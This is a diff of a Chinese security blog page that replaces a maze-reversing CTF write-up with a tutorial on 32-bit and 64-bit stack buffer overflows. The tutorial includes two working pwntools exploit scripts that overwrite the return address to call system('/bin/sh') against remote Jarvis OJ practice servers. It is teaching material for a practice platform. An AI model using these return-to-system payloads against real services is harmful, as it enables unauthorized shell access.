@@ -15,28 +15,24 @@
 
 
 
-<meta name="description" content="暑期XMAN排位赛中一道逆向思路">
+<meta name="description" content="隔了好久不更，今儿就把搞懂的32位下和64位下的栈溢出漏洞分享一下咯，太菜，求大佬放过。">
 <meta property="og:type" content="article">
-<meta property="og:title" content="XMAN排位赛-babymaze">
-<meta property="og:url" content="http://xq.dropsec.xyz/2017/08/10/XMAN排位赛-babymaze/index.html">
+<meta property="og:title" content="缓冲区溢出--栈溢出">
+<meta property="og:url" content="http://xq.dropsec.xyz/2017/09/30/缓冲区溢出-栈溢出/index.html">
 <meta property="og:site_name" content="Mr_white">
-<meta property="og:description" content="暑期XMAN排位赛中一道逆向思路">
-<meta property="og:image" content="http://otc7tld02.bkt.clouddn.com/OD%E8%BE%85%E5%8A%A9.png">
-<meta property="og:image" content="http://otc7tld02.bkt.clouddn.com/IDA%E7%BF%BB%E8%AF%91.png">
-<meta property="og:image" content="http://otc7tld02.bkt.clouddn.com/XMAN.png">
-<meta property="og:image" content="http://otc7tld02.bkt.clouddn.com/%E6%B1%87%E7%BC%96%E8%BF%B7%E5%AE%AB%E8%B5%8B%E5%80%BC.png">
-<meta property="og:image" content="http://otc7tld02.bkt.clouddn.com/%E8%BF%B7%E5%AE%AB%E6%95%B0%E6%8D%AEOD.png">
-<meta property="og:image" content="http://otc7tld02.bkt.clouddn.com/%E6%95%B0%E5%AD%97%E8%BF%B7%E5%AE%AB.png">
-<meta property="og:image" content="http://otc7tld02.bkt.clouddn.com/%E4%B8%8A%E4%B8%8B%E5%B7%A6%E5%8F%B3.png">
-<meta property="og:image" content="http://otc7tld02.bkt.clouddn.com/%E5%88%A4%E6%96%AD%E4%BE%9D%E6%8D%AE.png">
-<meta property="og:image" content="http://otc7tld02.bkt.clouddn.com/01%E5%A1%AB%E5%85%85.png">
-<meta property="og:image" content="http://otc7tld02.bkt.clouddn.com/%E6%9C%80%E7%BB%88%E5%88%A4%E6%96%AD.png">
-<meta property="og:image" content="http://otc7tld02.bkt.clouddn.com/%E8%BF%B7%E5%AE%AB%E4%B9%8B%E6%97%85.png">
-<meta property="og:updated_time" content="2017-08-10T13:31:09.971Z">
+<meta property="og:description" content="隔了好久不更，今儿就把搞懂的32位下和64位下的栈溢出漏洞分享一下咯，太菜，求大佬放过。">
+<meta property="og:image" content="http://ww2.sinaimg.cn/large/006HJ39wgy1fh7povczmjj30mr0cs74f.jpg">
+<meta property="og:image" content="http://otc7tld02.bkt.clouddn.com/TIM%E6%88%AA%E5%9B%BE20170930091014.jpg">
+<meta property="og:image" content="http://otc7tld02.bkt.clouddn.com/le2_main.jpg">
+<meta property="og:image" content="http://otc7tld02.bkt.clouddn.com/le2%E5%8F%BC.jpg">
+<meta property="og:image" content="http://otc7tld02.bkt.clouddn.com/sys.jpg">
+<meta property="og:image" content="http://otc7tld02.bkt.clouddn.com/sh.jpg">
+<meta property="og:image" content="http://otc7tld02.bkt.clouddn.com/64l.jpg">
+<meta property="og:updated_time" content="2017-09-30T01:49:06.781Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="XMAN排位赛-babymaze">
-<meta name="twitter:description" content="暑期XMAN排位赛中一道逆向思路">
-<meta name="twitter:image" content="http://otc7tld02.bkt.clouddn.com/OD%E8%BE%85%E5%8A%A9.png">
+<meta name="twitter:title" content="缓冲区溢出--栈溢出">
+<meta name="twitter:description" content="隔了好久不更，今儿就把搞懂的32位下和64位下的栈溢出漏洞分享一下咯，太菜，求大佬放过。">
+<meta name="twitter:image" content="http://ww2.sinaimg.cn/large/006HJ39wgy1fh7povczmjj30mr0cs74f.jpg">
 
 <link rel="apple-touch-icon" href= "/apple-touch-icon.png">
 
@@ -68,7 +64,7 @@
 <link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
 
 
-<title>XMAN排位赛-babymaze | Mr_white</title>
+<title>缓冲区溢出--栈溢出 | Mr_white</title>
 
 <script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
 <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
@@ -295,11 +291,11 @@
     </div>
     <link class="menu-list" tags="標籤" friends="友情鏈接" about="關於我"/>
 </nav>
-      <div class="body-wrap"><article id="post-XMAN排位赛-babymaze" class="article article-type-post" itemscope itemprop="blogPost">
+      <div class="body-wrap"><article id="post-缓冲区溢出-栈溢出" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a href="/2017/08/10/XMAN排位赛-babymaze/" class="article-date">
-      <time datetime="2017-08-10T12:44:23.000Z" itemprop="datePublished">2017-08-10</time>
+      <a href="/2017/09/30/缓冲区溢出-栈溢出/" class="article-date">
+      <time datetime="2017-09-30T00:51:36.000Z" itemprop="datePublished">2017-09-30</time>
 </a>
 
 
@@ -314,7 +310,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      XMAN排位赛-babymaze
+      缓冲区溢出--栈溢出
     </h1>
   
 
@@ -323,13 +319,13 @@
       <div class="article-info article-info-post">
         
     <div class="article-category tagcloud">
-    <a class="article-category-link" href="/categories/reverse/">reverse</a>
+    <a class="article-category-link" href="/categories/pwn/">pwn</a>
     </div>
 
 
         
     <div class="article-tag tagcloud">
-        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/writeup/">writeup</a></li></ul>
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/stack/">stack</a></li></ul>
     </div>
 
         <div class="clearfix"></div>
@@ -339,52 +335,69 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        <p>暑期XMAN排位赛中一道逆向思路<br><a id="more"></a></p>
-<p>看到题目名字，babymaze，中文意思是婴儿迷宫，看来是一个跟迷宫有关的题目。要不就是迷宫清空，要不就是走出迷宫。</p>
-<p>好了，咱先打开题目输入看看，为了看得清楚防止一闪而过，我们就用OD打一个辅助好了。</p>
-<center><img src="http://otc7tld02.bkt.clouddn.com/OD%E8%BE%85%E5%8A%A9.png" width="300" hight="300" alt=""></center>
+        <p>隔了好久不更，今儿就把搞懂的32位下和64位下的栈溢出漏洞分享一下咯，太菜，求大佬放过。<br><a id="more"></a></p>
+<h2 id="Ⅰ-预热"><a href="#Ⅰ-预热" class="headerlink" title="Ⅰ.预热"></a>Ⅰ.预热</h2><p>搞懂栈溢出前提得把函数调用的时候栈内的变化和操作顺序，esp和ebp两个寄存器中指针的变化。这两个方面可参照前面这篇<a href="http://xq.dropsec.xyz/2017/07/04/%E5%A0%86%E6%A0%88%E5%8F%8A%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80/">文章</a>。</p>
+<h2 id="Ⅱ-原理"><a href="#Ⅱ-原理" class="headerlink" title="Ⅱ.原理"></a>Ⅱ.原理</h2><h3 id="①-简介"><a href="#①-简介" class="headerlink" title="①.简介"></a>①.简介</h3><p>栈溢出，顾名思义，就是把栈给搞炸，通过覆盖的方式把需要利用的地方进行修改，从而达到攻击的效果。</p>
+<h3 id="②-细说"><a href="#②-细说" class="headerlink" title="②.细说"></a>②.细说</h3><p>借用一下前面的图和例子，main函数在调用func_A函数的时候会主动压入返回地址，这个返回地址是为了让func_A执行结束之后能找到回家的路（也就是回到母函数内执行。)然后就是funcA局部变量入栈，最后跳转到代码区进行执行指令了。func_B被调用func_A也重复了main函数的工作，这里就不在多说。</p>
+<center><img src="http://ww2.sinaimg.cn/large/006HJ39wgy1fh7povczmjj30mr0cs74f.jpg" alt=""></center>
+
+<p>那么在func_B执行的时候，我们计算好局部变量（后面简称buf）的大小，假设为0x16这么大，那么就可以用0x16的任意数字或字母进行填充，这样这个盒子就被填满了，</p>
+<p>另外别忘了，现在func_B现在在栈里打头阵的，所以esp和ebp分别在栈帧上方和局部变量下方，那么ebp也需要被填充，这里要注意在32bit下是4字节，而在64bit下就是8字节了。</p>
+<p>同样是任意字符填充，再往下就是返回地址了，关键地方，然后我们想要调用的函数地址get到之后将原来的返回地址已覆盖就完成漏洞利用了。</p>
+<center><img src="http://otc7tld02.bkt.clouddn.com/TIM%E6%88%AA%E5%9B%BE20170930091014.jpg" alt=""></center>
+
+<h3 id="③-传参"><a href="#③-传参" class="headerlink" title="③.传参"></a>③.传参</h3><p>32bit：参数是直接存放在栈中的。</p>
+<p>64bit：<br>如果函数的参数数量小于 6 , 则从左至右依次存放在寄存器 :<br>rdi, rsi, rdx, rcx, r8, r9 </p>
+<p>如果大于 6 , 那么多出来的参数按照从右至左的顺序依次压栈<br>x64的栈帧在返回地址额下面</p>
+<p><a href="http://eli.thegreenplace.net/2011/09/06/stack-frame-layout-on-x86-64" target="_blank" rel="external">给一个看到的链接，关于64bit的传参问题</a></p>
+<h3 id="Ⅲ-乘热打铁。"><a href="#Ⅲ-乘热打铁。" class="headerlink" title="Ⅲ.乘热打铁。"></a>Ⅲ.乘热打铁。</h3><p>来两道例题练练好了。<a href="https://www.jarvisoj.com/about" target="_blank" rel="external">这里是出处</a></p>
+<h4 id="32bit："><a href="#32bit：" class="headerlink" title="32bit："></a>32bit：</h4><p>主函数，里面有一个函数调用。</p>
+<center><img src="http://otc7tld02.bkt.clouddn.com/le2_main.jpg" alt=""></center>
 
 
-<p>word天，居然还是日文，吓的我赶紧翻译了一波，好像是不对的意思吧。。暂且不管。用IDA看看关键代码吧。</p>
-<center><img src="http://otc7tld02.bkt.clouddn.com/IDA%E7%BF%BB%E8%AF%91.png" width="400" hight="400" alt=""></center>
+<p>跟进来，定义了数组大小0x88(ebp-88h看出)，read读入数据，那就可以进行利用。</p>
+<center><img src="http://otc7tld02.bkt.clouddn.com/le2%E5%8F%BC.jpg" alt=""></center>
+
+<p>查看一下导入表，程序已经给绑定好了system函数，和/bin/sh这个command，那么我们直接把地址拿来用就好了。</p>
+<center><img src="http://otc7tld02.bkt.clouddn.com/sys.jpg" alt=""></center>
 
 
-<p>又发现一撮日文，一个个翻译了下，意思已经标注，（如上图所示）有正确提示和错误提示，但是就是没有发现刚才出现的那个提示，所以想这个还是一个调用，所以我们往前追溯。</p>
-<center><img src="http://otc7tld02.bkt.clouddn.com/XMAN.png" width="400" hight="400" alt=""></center>
+<center><img src="http://otc7tld02.bkt.clouddn.com/sh.jpg" alt=""></center>
+
+<p>贴上简单的exp：（junk和ebp做到覆盖buf数组，然后覆盖返回地址为system的调用地址，最后给函数传入指令参数，完成利用。这里的p32是为了让系统能够接收而对地址进行了打包，下面例子中p64也是同样的效果。p.send是向服务器发送数据，最后一句是与服务器交互。）</p>
+<pre><code>from pwn import *
+#buf=0x88
+#p = process(&apos;./level&apos;)
+p = remote(&apos;pwn2.jarvisoj.com&apos;,9878)
+
+systemaddr=0x08048320
+shelladdr=0x0804A024
+junk=&apos;a&apos;*0x88
+ebp=&apos;aaaa&apos;
+payload=junk+ebp+p32(systemaddr)+p32(4)+p32(shelladdr)
+p.send(payload)
+p.interactive()
+</code></pre><h4 id="64bit："><a href="#64bit：" class="headerlink" title="64bit："></a>64bit：</h4><p>和上面一题是孪生兄弟，只是一个32bit，一个64bit下的。程序一模一样，所以思路也就类似，如图。</p>
+<center><img src="http://otc7tld02.bkt.clouddn.com/64l.jpg" alt=""></center>
 
 
-<p>Ok,找到了，上图可以看出第一步，也就是flag的格式了，必须是xman{xxxxxxxx}的格式，那么，在123和125的验证中间还有一个函数调用，这儿也就是我们刚才看到的那另一串答案提示了。</p>
-<center><img src="http://otc7tld02.bkt.clouddn.com/%E6%B1%87%E7%BC%96%E8%BF%B7%E5%AE%AB%E8%B5%8B%E5%80%BC.png" width="400" hight="400" alt=""></center>
+<p>直接给出exp：（ELF是加载level2_x64程序。下面一句则可以直接获得system的调用位置，前面提到，64bit下参数是提前存放在寄存器中，然后函数需要参数时候，由寄存器传参。因为我们只需要传入command参数，所以我们只需要知道rdi寄存器所在位置。最后步骤就是，0x80(buf)+8(ebp)+到寄存器地址+传入参数+system函数调用）</p>
+<pre><code>from pwn import *
+#buf = 0x80
+#p=process(&apos;./level2_x64&apos;)
+p=remote(&apos;pwn2.jarvisoj.com&apos;,9882)
 
+level2=ELF(&apos;./level2_x64&apos;)
+systemaddr=level2.plt[&apos;system&apos;]
+print systemaddr
 
-<p>看上图这一串数据，应该就是构成迷宫的关键了吧，如果看不出来咱可以用OD，验证一下咯，输入xman{1231231231231234},这样程序就会跑到那儿去进行赋值进行迷宫的制造，然后我们看看数据就可以看出来迷宫了。</p>
-<center><img src="http://otc7tld02.bkt.clouddn.com/%E8%BF%B7%E5%AE%AB%E6%95%B0%E6%8D%AEOD.png" width="400" hight="400" alt=""></center>
+shelladdr=0x0000000000600a90
+rdireaddr=0x00000000004006b3
 
-
-<p>我们把迷宫排列一下就是下面这个样子了。</p>
-<center><img src="http://otc7tld02.bkt.clouddn.com/%E6%95%B0%E5%AD%97%E8%BF%B7%E5%AE%AB.png" width="300" hight="300" alt=""></center>
-
-
-<p>继续往下分析。看到了四个判断嵌套，分别是1，2，3，4的if判断，点进去看的东西如下图注释，1234分别代表左右上下。除此以外我们还可以看出A1指针代表列，A2指针代表行。</p>
-<center><img src="http://otc7tld02.bkt.clouddn.com/%E4%B8%8A%E4%B8%8B%E5%B7%A6%E5%8F%B3.png" width="400" hight="400" alt=""></center>
-
-
-<p>要问判断依据？，看下面这个图的红色剪头，由于刚才看到的迷宫是六行九列的，那么与9相乘的数据就是列所在指针，后面的加数就是行所在指针，而且这里红色箭头指向的函数返回的数据是与32进行对比是否一样，一样则是0，那么和1异或，如果不一样，你懂得。~~~</p>
-<center><img src="http://otc7tld02.bkt.clouddn.com/%E5%88%A4%E6%96%AD%E4%BE%9D%E6%8D%AE.png" width="400" hight="400" alt=""></center>
-
-
-<p>而32的十六进制就是0x20<br>也就是迷宫的数据，我们把迷宫用01进行填充一下好了。</p>
-<center><img src="http://otc7tld02.bkt.clouddn.com/01%E5%A1%AB%E5%85%85.png" width="200" hight="200" alt=""></center>
-
-
-<p>下面就剩下最后的两个判断，一是是否走到尽头，二是是否只走了16步。</p>
-<center><img src="http://otc7tld02.bkt.clouddn.com/%E6%9C%80%E7%BB%88%E5%88%A4%E6%96%AD.png" width="400" hight="400" alt=""></center>
-
-
-<p>OK，全部搞懂了吧，开始你的迷宫之旅。</p>
-<center><img src="http://otc7tld02.bkt.clouddn.com/%E8%BF%B7%E5%AE%AB%E4%B9%8B%E6%97%85.png" width="400" hight="400" alt=""></center>
-
-
+payload=&apos;a&apos;*136+p64(rdireaddr)+p64(shelladdr)+p64(systemaddr)
+p.send(payload)
+p.interactive()
+</code></pre>
       
     </div>
     
@@ -392,13 +405,13 @@
   
     
     <div class="copyright">
-        <p><span>本文標題:</span><a href="/2017/08/10/XMAN排位赛-babymaze/">XMAN排位赛-babymaze</a></p>
+        <p><span>本文標題:</span><a href="/2017/09/30/缓冲区溢出-栈溢出/">缓冲区溢出--栈溢出</a></p>
         <p><span>文章作者:</span><a href="/" title="回到主頁">Mr_white</a></p>
-        <p><span>發布時間:</span>2017-08-10, 20:44:23</p>
-        <p><span>最後更新:</span>2017-08-10, 21:31:09</p>
+        <p><span>發布時間:</span>2017-09-30, 08:51:36</p>
+        <p><span>最後更新:</span>2017-09-30, 09:49:06</p>
         <p>
-            <span>原始鏈接:</span><a class="post-url" href="/2017/08/10/XMAN排位赛-babymaze/" title="XMAN排位赛-babymaze">http://xq.dropsec.xyz/2017/08/10/XMAN排位赛-babymaze/</a>
-            <span class="copy-path" data-clipboard-text="原文: http://xq.dropsec.xyz/2017/08/10/XMAN排位赛-babymaze/　　作者: Mr_white" title="點擊複製文章鏈接"><i class="fa fa-clipboard"></i></span>
+            <span>原始鏈接:</span><a class="post-url" href="/2017/09/30/缓冲区溢出-栈溢出/" title="缓冲区溢出--栈溢出">http://xq.dropsec.xyz/2017/09/30/缓冲区溢出-栈溢出/</a>
+            <span class="copy-path" data-clipboard-text="原文: http://xq.dropsec.xyz/2017/09/30/缓冲区溢出-栈溢出/　　作者: Mr_white" title="點擊複製文章鏈接"><i class="fa fa-clipboard"></i></span>
             <script> var clipboard = new Clipboard('.copy-path'); </script>
         </p>
         <p>
@@ -410,16 +423,10 @@
 
     <nav id="article-nav">
         
-            <div id="article-nav-newer" class="article-nav-title">
-                <a href="/2017/09/30/缓冲区溢出-栈溢出/">
-                    缓冲区溢出--栈溢出
-                </a>
-            </div>
-        
         
             <div id="article-nav-older" class="article-nav-title">
-                <a href="/2017/07/21/小论PE结构/">
-                    小论PE结构
+                <a href="/2017/08/10/XMAN排位赛-babymaze/">
+                    XMAN排位赛-babymaze
                 </a>
             </div>
         
@@ -431,7 +438,7 @@
     <div id="toc" class="toc-article">
         <strong class="toc-title">文章目錄</strong>
         
-            
+            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Ⅰ-预热"><span class="toc-number">1.</span> <span class="toc-text">Ⅰ.预热</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Ⅱ-原理"><span class="toc-number">2.</span> <span class="toc-text">Ⅱ.原理</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#①-简介"><span class="toc-number">2.1.</span> <span class="toc-text">①.简介</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#②-细说"><span class="toc-number">2.2.</span> <span class="toc-text">②.细说</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#③-传参"><span class="toc-number">2.3.</span> <span class="toc-text">③.传参</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Ⅲ-乘热打铁。"><span class="toc-number">2.4.</span> <span class="toc-text">Ⅲ.乘热打铁。</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#32bit："><span class="toc-number">2.4.1.</span> <span class="toc-text">32bit：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#64bit："><span class="toc-number">2.4.2.</span> <span class="toc-text">64bit：</span></a></li></ol></li></ol></li></ol>
         
     </div>
     <style>
@@ -473,15 +480,13 @@
 
     <div class="scroll" id="post-nav-button">
         
-            <a href="/2017/09/30/缓冲区溢出-栈溢出/" title="上一篇: 缓冲区溢出--栈溢出">
-                <i class="fa fa-angle-left"></i>
-            </a>
+            <a href="/" title="回到主頁"><i class="fa fa-home"></i></a>
         
 
         <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
 
         
-            <a href="/2017/07/21/小论PE结构/" title="下一篇: 小论PE结构">
+            <a href="/2017/08/10/XMAN排位赛-babymaze/" title="下一篇: XMAN排位赛-babymaze">
                 <i class="fa fa-angle-right"></i>
             </a>
         
